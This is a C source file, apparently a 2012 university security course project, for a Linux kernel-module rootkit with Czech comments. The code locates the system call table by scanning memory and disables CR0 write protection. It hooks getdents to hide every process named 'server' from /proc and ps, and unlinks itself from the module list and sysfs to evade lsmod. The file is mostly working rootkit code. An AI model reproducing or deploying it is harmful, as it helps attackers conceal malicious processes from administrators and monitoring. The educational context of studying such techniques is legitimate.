/*
 * Autor: Roman Janko
 * Login: xjanko04
 * Datum: 3. 11. 2012
 * Projekt: 1. projekt do predmetu BIS
 * Popis: Cilem rootkitu je skryt nektere procesy ve virtualnim adresari /proc. Pak
 *        totiz nebudou videt ve vypisu programu ps.
 *        Rootkit upravuje tabulku systemovych volani - konkretne funkci getdents().
 *        Getdents (get directory entries) je volano pro vypis obsahu adresare.
 *        Do tabulky systemovych volani podstrcim vlastni funkci getdents().
 */

#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/string.h>
#include <linux/syscalls.h>

// jmeno programu, ktery chci skryt
char jmeno_program_ke_skryti[] = "server";

#define POCET 20

// rozsah adres, kde budu hledat sys_call_table
#define PAMET_START 0xc0000000
#define PAMET_KONEC 0xd0000000

// ukazatel na tabulku systemovych volani
unsigned long *sys_call_table; // = (unsigned long *)0xc08462b0;

// struktura dirent
struct linux_dirent {
   long           d_ino;
   off_t          d_off;
   unsigned short d_reclen;
   char           d_name[];
};

// ukazatel na puvodni funkci
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

/*
 * Na zaklade jmen procesu, ktere chci skryt, naplnuju pole seznamem pidu techto procesu.
 */
static void vrat_pidy_programu_ke_skryti(pid_t seznam_cisel_procesu[])
{
   int i = 0;
   struct task_struct *task;

   for_each_process(task)
   {
      //printk("%s [%d]\n",task->comm , task->pid);
      if ( strcmp(task->comm, jmeno_program_ke_skryti) == 0 )
      {
         if ( i < POCET )
         {
            seznam_cisel_procesu[i] = task->pid;
            i++;
         }
      }
   }
}

/*
 * V /proc ma kazdy proces slozku, ktera odpovida jeho cislo procesu tzv. pid.
 * seznam_cisel_procesu[] je pole pidu ke skryti. Zjisteno na zaklade jmena procesu
 *                        viz funkce vrat_pidy_programu_ke_skryti.
 */
static bool test_jestli_skryt(pid_t seznam_cisel_procesu[], char *jmeno_adresare)
{
   char *x;
   int pid, i;

   pid = simple_strtol(jmeno_adresare, &x, 10);

   if ( strlen(x) != 0 )
   {  // nepovedlo se prevest na cislo
      return false;
   }

   for (i = 0; i < POCET; i++)
   {
      if ( seznam_cisel_procesu[i] == pid )
         return true;
   }

   return false;
}

/*
 * Upravena funkce get directory entries. Zavola puvodni funkci, ta naplni buffer dirp a tento buffer
 * nasledne upravi. V bufferu jsou ulozeny structy linux_dirent s udaji o adresarich. Pokud chci nektery
 * schovat, staci tuto strukturu odstranit z dirp.
 */
asmlinkage long hacknuty_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)  
{
   long nread;
   struct linux_dirent *novy_dirp, *d;
   int bpos;
   pid_t seznam_cisel_procesu[POCET]; 

   // zavolam puvodni funkci
   nread = (*orig_getdents)(fd, dirp, count); 

   if (nread <= 0) 
      return nread;

   // naalokuju novy buffer, dirp buffer je jen pro cteni
   novy_dirp = kmalloc(count, GFP_KERNEL);

   if (!novy_dirp) 
   {
      printk("Error: kmalloc\n");
      return nread;
   }

   // nakopiruju data z dirp bufferu do meho bufferu
   if ( copy_from_user(novy_dirp, dirp, count) != 0 )
   {
      printk("Error: copy_from_user\n");
      kfree(novy_dirp);
      return nread;
   }

   // zjistim se pid cisla procesu, ktere chci skryt
   vrat_pidy_programu_ke_skryti(seznam_cisel_procesu); 

   // upravim
   for (bpos = 0; bpos < nread;)
   {
      d = (struct linux_dirent *) ((char *)novy_dirp + bpos);

      if ( test_jestli_skryt(seznam_cisel_procesu, (char *) d->d_name) )
      {
         // posunu celou strukturu
         nread -= d->d_reclen;
         memcpy( d, (struct linux_dirent *) ((char *)novy_dirp + bpos + d->d_reclen), nread-bpos );
         continue;
      }

      bpos += d->d_reclen;
   } 
   
   // prekopiruju do dirp bufferu
   if ( copy_to_user(dirp, novy_dirp, count) != 0 )
   {
      printk("Error: copy_to_user\n");
   }

   // uvolnim pamet
   kfree(novy_dirp);

   return nread;
}

/*
 * Odstrani modul z ruznych struktur, takze nebude videt pres lsmod ani v /sys/module/.
 */
static void schovej_tento_modul(void)
{
   list_del_init(&__this_module.list);
   kobject_del(&__this_module.mkobj.kobj);
   list_del(&__this_module.mkobj.kobj.entry);
}

/*
 * Postupne prohledavam pamet od PAMET_START do PAMET_KONEC. V kazde iteraci posouvam
 * ukazatel na tabulku a pomoci exportovaneho volani sys_close (znam jeho adresu) se
 * ptam, jestli jsem se trefil do zacatku skutecne tabulky systemovych volani. Vracim
 * jeji adresu. Bude fungovat pouze na 32-bitove architekture!
 */
static unsigned long **najdi_tabulku_systemovych_volani(void)
{
   unsigned long int i = PAMET_START;
   unsigned long **sc_tabulka;

   // prohledavam pamet od PAMET_START do PAMET_KONEC
   while ( i < PAMET_KONEC ) 
   {
      sc_tabulka = (unsigned long **) i;

      // porovnavam s exportovanym volanim sys_close
      if ( sc_tabulka[__NR_close] == (unsigned long *) sys_close )
      {
         return &(*sc_tabulka);
      }
		
      // postupne posouvam ukazatel na sc_tabulka
      i += sizeof(void *);
   }

	return NULL;
}

/*
 * Nastavi WP (Write protect) bit na 0 v registru CR0. To umozni CPU zapisovat i do stranek, 
 * ktere jsou jen read-only. Jedna se o 16. bit v registru.
 */
static void vypni_protected_mode(void)
{
   write_cr0 (read_cr0 () & (~ 0x10000));
}

/*
 * Nastavi WP (Write protect) bit na 1 v registru CR0. Zapne protected mod.
 */
static void zapni_protected_mode(void)
{
   write_cr0 (read_cr0 () | 0x10000);
}

static int init(void) 
{
   vypni_protected_mode();

   // zjistim si adresu do sys_call_table
   sys_call_table = (unsigned long *) najdi_tabulku_systemovych_volani();

   if ( sys_call_table == NULL ) 
   {
      printk("Error: sct nenalezena!\n");
      return 0;
   }
   
   // schovam modul
   schovej_tento_modul();

   // nastavim ukazatel v tabulce na svoji funkci
   orig_getdents = (void *) sys_call_table[__NR_getdents];
   sys_call_table[__NR_getdents] = (unsigned long) hacknuty_getdents;  

   zapni_protected_mode();

   return 0;
}

static void exit(void)
{
   vypni_protected_mode();

   // vratim tabulku do puvodniho stavu
   sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;

   zapni_protected_mode();
   
   return;
}

module_init(init);
module_exit(exit);

